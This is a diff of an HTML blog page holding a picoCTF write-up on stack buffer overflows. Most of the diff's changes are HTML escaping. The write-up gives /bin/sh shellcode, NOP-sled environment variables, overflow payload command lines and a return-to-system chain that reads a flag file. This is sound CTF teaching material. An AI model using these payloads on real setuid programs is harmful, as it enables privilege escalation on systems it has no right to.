@@ -100,22 +100,22 @@
 <a href="http://en.wikipedia.org/wiki/Shellcode">shellcode</a>&nbsp;(<a href="http://www.exploit-db.com/shellcode/">examples</a>). For picoCTF, we were given shellcode, but that&#39;s not always the case.</p>
 
 <p>Here is the shellcode given to us (in hex):</p>
-<div class="highlight"><pre><code class="language-text" data-lang="text">00000000 31 c0 f7 e9 50 68 2f 2f 73 68 68 2f 62 69 6e 89 |1...Ph//shh/bin.|
+<div class="highlight"><pre><code class="language-" data-lang="">00000000 31 c0 f7 e9 50 68 2f 2f 73 68 68 2f 62 69 6e 89 |1...Ph//shh/bin.|
 00000010 e3 50 68 2d 70 69 69 89 e6 50 56 53 89 e1 b0 0b |.Ph-pii..PVS....|
 00000020 cd 80                       |..|
 </code></pre></div>
 <p>When this piece of code gets executed, we get a shell. We want a shell to spawn because usually the <a href="http://en.wikipedia.org/wiki/Setuid">SUID</a>&nbsp;of the binary is set to a&nbsp;privileged&nbsp;user, which allows use to read flags from the disk.</p>
 
 <p>The way you add this shellcode (below is a different shellcode) to your buffer overflow, is to add it to an environment variable:</p>
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">export </span><span class="nv">EXPLOIT</span><span class="o">=</span><span class="k">$(</span>python -c <span class="s1">&#39;print &quot;\x90&quot;*1000+&quot;\xeb\x18\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\xe8\xe3\xff\xff\xff/bin/sh&quot;&#39;</span><span class="k">)</span>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">export </span><span class="nv">EXPLOIT</span><span class="o">=</span><span class="k">$(</span>python -c <span class="s1">'print "\x90"*1000+"\xeb\x18\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\xe8\xe3\xff\xff\xff/bin/sh"'</span><span class="k">)</span>
 </code></pre></div>
 <p>Notice the &quot;\x90&quot;. This is a <a href="http://en.wikipedia.org/wiki/NOP_slide">NOP (no operation) sled</a>, which basically means that it gets skipped over as meaningless code (From what I understand, the NOP allows the memory address to be off by a bit and it will still work).</p>
 
 <p>Then to find its memory address we have a small C program:</p>
-<div class="highlight"><pre><code class="language-c" data-lang="c">     <span class="cp">#include &lt;stdio.h&gt;</span>
-     <span class="cp">#include &lt;stdlib.h&gt;</span>
-     <span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
-       <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">%p</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&quot;EXPLOIT&quot;</span><span class="p">));</span>
+<div class="highlight"><pre><code class="language-c" data-lang="c">     <span class="cp">#include &lt;stdio.h&gt;
+</span>     <span class="cp">#include &lt;stdlib.h&gt;
+</span>     <span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
+       <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">%p</span><span class="se">\n\n</span><span class="s">"</span><span class="p">,</span> <span class="n">getenv</span><span class="p">(</span><span class="s">"EXPLOIT"</span><span class="p">));</span>
        <span class="k">return</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
      <span class="p">}</span>
 </code></pre></div>
@@ -142,42 +142,42 @@
 <code>./buffer_overflow_shellcode $(cat shellcode)$(python -c&#39;print &quot;BB&quot;+&quot;A&quot;*40+&quot;\x40\xd5\xff\xff&quot;&#39;)</code></p>
 
 <p>(alternate solution if not given stack trace):</p>
-<div class="highlight"><pre><code class="language-text" data-lang="text"> export EXPLOIT=$(python -c &quot;print &#39;\x90&#39;*1000&quot;)$(cat shellcode)
+<div class="highlight"><pre><code class="language-" data-lang=""> export EXPLOIT=$(python -c "print '\x90'*1000")$(cat shellcode)
 </code></pre></div>
 <p>(run environment program above to get its address: 0xffffd433 - Assumes no <a href="http://en.wikipedia.org/wiki/Address_space_layout_randomization">ASLR</a>)</p>
-<div class="highlight"><pre><code class="language-text" data-lang="text">./buffer_overflow_shellcode $(python -c &quot;print &#39;\x33\xd4\xff\xff&#39;*200&quot;)
+<div class="highlight"><pre><code class="language-" data-lang="">./buffer_overflow_shellcode $(python -c "print '\x33\xd4\xff\xff'*200")
 </code></pre></div>
 <p>and overflow 5 (non-executable memory):                                                   <code>(overflow)</code> <code>(&lt;system&gt;)</code>     <code>(called)</code> <code>(&#39;/bin/sh&#39; from environment)</code></p>
-<div class="highlight"><pre><code class="language-text" data-lang="text">./buffer_overflow_shellcode_hard $(python -c &#39;print &quot;A&quot;*1036+&quot;\x50\x82\xe6\xf7&quot;+&quot;sh;#&quot; +  &quot;\x11\xd8\xff\xff&quot;&#39;)
+<div class="highlight"><pre><code class="language-" data-lang="">./buffer_overflow_shellcode_hard $(python -c 'print "A"*1036+"\x50\x82\xe6\xf7"+"sh;#" +  "\x11\xd8\xff\xff"')
 </code></pre></div>
 <p>(Note, the address for &#39;/bin/sh&#39; from gdb was&nbsp;0xffffd80f and wasn&#39;t working, so I just played with the address (increased by 1, then 1 more) until it worked - note also that I used gdb instead of the normal dump program above, as the address was different. This is because the stack got modified slightly during execution (out of our control). The <system> comes from ROP (found with gdb), so stay tuned for more info on that).
     gdb looked like this:</p>
-<div class="highlight"><pre><code class="language-text" data-lang="text">     (gdb) break main
+<div class="highlight"><pre><code class="language-" data-lang="">     (gdb) break main
      (gdb) run
      (gdb) x/s *((char **)environ)
-     0xffffd805:      &quot;EXPLOIT=/bin/sh&quot;
+     0xffffd805:      "EXPLOIT=/bin/sh"
      (gdb) x/s 0xffffd80d
-     0xffffd80d:      &quot;/bin/sh&quot;
+     0xffffd80d:      "/bin/sh"
 </code></pre></div>
 <h4>Update:</h4>
 
 <p>Getting environment variables does not always work (ie. overflow 5) so I came up with an alternate solution, using PATH and a string from the binary. Here is what the process looks like:</p>
-<div class="highlight"><pre><code class="language-text" data-lang="text">     mkdir cmd
+<div class="highlight"><pre><code class="language-" data-lang="">     mkdir cmd
      cd cmd
-     echo &quot;cat /problems/stack_overflow_5_0353c1a83cb2fa0d/key&quot; &gt; a
+     echo "cat /problems/stack_overflow_5_0353c1a83cb2fa0d/key" &gt; a
      chmod +x a
      export PATH=/home2/user1792/cmd:$PATH
      cd /problems/stack_overflow_5_0353c1a83cb2fa0d
      gdb buffer_overflow_shellcode_hard
      (gdb) break main
      (gdb) run
-     (gdb) find &amp;system,+999999,&quot;a&quot;
+     (gdb) find &amp;system,+999999,"a"
      &gt;&gt; 0xf7e9e6ab #this is the address we will use
      &gt;&gt; 0xf7f0fb8e &lt;setpriority+14&gt;
      &gt;&gt; (cont.)
 </code></pre></div>
 <p><code>(fill)</code>    <code>(system)</code>          <code>(junk)</code>    <code>(&quot;a&quot; address)</code></p>
-<div class="highlight"><pre><code class="language-text" data-lang="text">./buffer_overflow_shellcode_hard $(python -c &#39;print &quot;A&quot;*1036+&quot;\x50\x82\xe6\xf7&quot;+&quot;AAAA&quot; +&quot;\xab\xe6\xe9\xf7&quot;&#39;)
+<div class="highlight"><pre><code class="language-" data-lang="">./buffer_overflow_shellcode_hard $(python -c 'print "A"*1036+"\x50\x82\xe6\xf7"+"AAAA" +"\xab\xe6\xe9\xf7"')
 </code></pre></div>
 <p>Here are some good sources for more information on buffer overflows:<br>
 <a href="http://insecure.org/stf/smashstack.html">http://insecure.org0xffffd7f0/stf/smashstack.html</a><br>
@@ -222,22 +222,6 @@
             </section>
 
             
-            <section class="disqus">
-        	    <div id="disqus_thread"></div>
-              <script type="text/javascript">
-                  /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
-                  var disqus_shortname = 'zolmeister'; // required: replace example with your forum shortname
-
-                  /* * * DON'T EDIT BELOW THIS LINE * * */
-                  (function() {
-                      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
-                      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
-                      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-                  })();
-              </script>
-
-            </section>
-            
 
         </footer>
 
@@ -249,7 +233,7 @@
     <footer class="site-footer">
         <a class="subscribe icon-feed" href="feeds/posts/default"><span class="tooltip">Subscribe!</span></a>
         <div class="inner">
-             <section class="copyright">All content copyright <a href="">Zolmeister</a> &copy;  &bull; All rights reserved.</section>
+             <section class="copyright">All content copyright <a href="">Zolmeister</a> &copy; 2016 &bull; All rights reserved.</section>
         </div>
     </footer>
 
